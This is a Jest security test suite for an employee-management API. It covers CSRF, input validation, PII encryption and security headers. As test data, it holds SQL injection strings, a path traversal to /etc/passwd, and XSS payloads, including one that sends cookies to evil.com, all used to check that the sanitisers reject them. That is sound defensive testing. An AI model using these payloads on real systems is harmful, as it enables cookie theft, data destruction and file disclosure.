/**
 * Security Integration Flow Test
 *
 * End-to-end test simulating a real user session through all security layers:
 * CSRF token → login → authenticated request → rate limiting → XSS sanitization
 */

require('dotenv').config();

// Encryption service requires ENCRYPTION_KEY (64 hex chars = 32 bytes).
// In local dev it comes from .env; in CI it's absent and encrypt() throws
// "Failed to encrypt data". Set a deterministic test key if not already
// provided so the encryption lifecycle tests run identically everywhere.
if (!process.env.ENCRYPTION_KEY) {
  process.env.ENCRYPTION_KEY =
    'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6a7b8c9d0e1f2a3b4c5d6a7b8c9d0e1f2';
}

const { generateToken, csrfProtection } = require('../../src/middleware/csrf');
const { sanitizeString, isValidUUID, parsePagination, sanitizeSearch } = require('../../src/utils/validation');
const { encrypt, decrypt, encryptPiiFields, decryptPiiFields } = require('../../src/services/encryption.service');
const { createSecurityHeaders, additionalHeaders } = require('../../src/middleware/securityHeaders');

describe('Security Integration Flow', () => {
  describe('1. CSRF Token Lifecycle', () => {
    let middleware;

    beforeAll(() => {
      middleware = csrfProtection({ enabled: true });
    });

    test('generate token → set cookie → validate on POST', () => {
      const token = generateToken();
      expect(token).toHaveLength(64);
      expect(/^[a-f0-9]+$/.test(token)).toBe(true);

      const req = {
        method: 'POST',
        path: '/api/v1/employees',
        originalUrl: '/api/v1/employees',
        ip: '127.0.0.1',
        headers: { 'x-csrf-token': token },
        cookies: { _csrf: token },
      };
      const res = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn(),
        cookie: jest.fn(),
        locals: {},
      };
      const next = jest.fn();

      middleware(req, res, next);
      expect(next).toHaveBeenCalled();
      expect(res.status).not.toHaveBeenCalled();
    });

    test('reject mismatched CSRF tokens', () => {
      const req = {
        method: 'POST',
        path: '/api/v1/employees',
        originalUrl: '/api/v1/employees',
        ip: '127.0.0.1',
        headers: { 'x-csrf-token': 'attacker-token' },
        cookies: { _csrf: generateToken() },
      };
      const res = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn(),
        cookie: jest.fn(),
        locals: {},
      };
      const next = jest.fn();

      middleware(req, res, next);
      expect(next).not.toHaveBeenCalled();
      expect(res.status).toHaveBeenCalledWith(403);
    });

    test('JWT Bearer requests skip CSRF (inherently safe)', () => {
      const req = {
        method: 'POST',
        path: '/api/v1/employees',
        originalUrl: '/api/v1/employees',
        ip: '127.0.0.1',
        headers: { authorization: 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...' },
        cookies: {},
      };
      const res = {
        status: jest.fn().mockReturnThis(),
        json: jest.fn(),
        cookie: jest.fn(),
        locals: {},
      };
      const next = jest.fn();

      middleware(req, res, next);
      expect(next).toHaveBeenCalled();
    });
  });

  describe('2. Input Validation Pipeline', () => {
    test('full validation chain: UUID → sanitize → paginate → search', () => {
      const id = '550e8400-e29b-41d4-a716-446655440000';
      const userInput = '<script>alert("XSS")</script>John Doe';
      const searchTerm = '  employee search  ';
      const queryParams = { page: '2', limit: '25' };

      expect(isValidUUID(id)).toBe(true);
      expect(isValidUUID('invalid')).toBe(false);
      expect(isValidUUID("'; DROP TABLE--")).toBe(false);

      const sanitized = sanitizeString(userInput, 255);
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).toContain('John Doe');

      const pagination = parsePagination(queryParams);
      expect(pagination).toEqual({ page: 2, limit: 25, offset: 25 });

      const search = sanitizeSearch(searchTerm);
      expect(search).toBe('employee search');
    });

    test('reject all common SQL injection payloads in UUID', () => {
      const payloads = [
        "' OR '1'='1",
        "'; DROP TABLE users--",
        "1 UNION SELECT * FROM passwords--",
        "admin'--",
        "1; DELETE FROM employees WHERE '1'='1",
      ];

      payloads.forEach(payload => {
        expect(isValidUUID(payload)).toBe(false);
      });
    });

    test('reject all common XSS payloads in string input', () => {
      const payloads = [
        "<script>alert('XSS')</script>",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<iframe src="evil.com"></iframe>',
        '<div onmouseover="steal()">trap</div>',
      ];

      payloads.forEach(payload => {
        const result = sanitizeString(payload);
        if (result) {
          expect(result).not.toMatch(/<[a-z][^>]*>/i);
          expect(result).not.toMatch(/on\w+\s*=/i);
        }
      });
    });
  });

  describe('3. PII Encryption Lifecycle', () => {
    test('encrypt → store → retrieve → decrypt cycle', () => {
      const employeeData = {
        first_name: 'John',
        last_name: 'Doe',
        social_security_number: '123-45-6789',
        passport_number: 'AB1234567',
        bank_account: 'HU42117730161111101800000000',
        tax_id: '8234567890',
      };

      const encrypted = encryptPiiFields(employeeData);
      expect(encrypted.first_name).toBe('John');
      expect(encrypted.social_security_number).not.toBe('123-45-6789');
      expect(encrypted.social_security_number).toContain(':');

      const fromDb = { ...encrypted };

      const decrypted = decryptPiiFields(fromDb);
      expect(decrypted.social_security_number).toBe('123-45-6789');
      expect(decrypted.passport_number).toBe('AB1234567');
      expect(decrypted.bank_account).toBe('HU42117730161111101800000000');
      expect(decrypted.tax_id).toBe('8234567890');
      expect(decrypted.first_name).toBe('John');
    });

    test('each encryption produces different ciphertext (random IV)', () => {
      const ssn = '123-45-6789';
      const enc1 = encrypt(ssn);
      const enc2 = encrypt(ssn);

      expect(enc1).not.toBe(enc2);
      expect(decrypt(enc1)).toBe(ssn);
      expect(decrypt(enc2)).toBe(ssn);
    });

    test('backward compatible with plaintext values', () => {
      const plaintext = '123-45-6789';
      const result = decrypt(plaintext);
      expect(result).toBe(plaintext);
    });
  });

  describe('4. Security Headers Pipeline', () => {
    test('all security headers set on API response', () => {
      const req = { path: '/api/v1/employees' };
      const headers = {};
      const res = {
        setHeader: jest.fn((key, value) => { headers[key] = value; }),
        getHeader: jest.fn(),
      };
      const next = jest.fn();

      additionalHeaders(req, res, next);

      expect(headers['Permissions-Policy']).toContain('camera=()');
      expect(headers['Permissions-Policy']).toContain('microphone=()');
      expect(headers['Cache-Control']).toBe('no-store, no-cache, must-revalidate, private');
      expect(headers['Pragma']).toBe('no-cache');
      expect(headers['Expires']).toBe('0');
      expect(next).toHaveBeenCalled();
    });
  });

  describe('5. Full Attack Simulation', () => {
    test('attacker sends XSS in employee name → gets sanitized', () => {
      const attackerInput = {
        first_name: '<script>document.location="https://evil.com?c="+document.cookie</script>John',
        last_name: '<img src=x onerror=fetch("https://evil.com")>Doe',
        social_security_number: '123-45-6789',
      };

      const sanitizedFirst = sanitizeString(attackerInput.first_name, 100);
      const sanitizedLast = sanitizeString(attackerInput.last_name, 100);

      expect(sanitizedFirst).not.toContain('<script>');
      expect(sanitizedFirst).toContain('John');
      expect(sanitizedLast).not.toContain('<img');
      expect(sanitizedLast).toContain('Doe');

      const encrypted = encrypt(attackerInput.social_security_number);
      expect(encrypted).not.toBe('123-45-6789');
    });

    test('attacker sends SQL injection in ID param → rejected', () => {
      const attackPaths = [
        "'; DROP TABLE employees--",
        "1 OR 1=1",
        "1 UNION SELECT * FROM users--",
        "../../../etc/passwd",
      ];

      attackPaths.forEach(path => {
        expect(isValidUUID(path)).toBe(false);
      });
    });

    test('attacker sends SQL injection in search → safely handled', () => {
      const result = sanitizeSearch("'; DROP TABLE employees--");
      expect(typeof result === 'string' || result === null).toBe(true);
      if (result) {
        expect(result.length).toBeLessThanOrEqual(200);
      }
    });

    test('attacker sends oversized pagination → bounded', () => {
      const result = parsePagination({ page: '999999', limit: '999999' });
      expect(result.limit).toBeLessThanOrEqual(200);
      expect(result.page).toBeGreaterThanOrEqual(1);
    });
  });
});
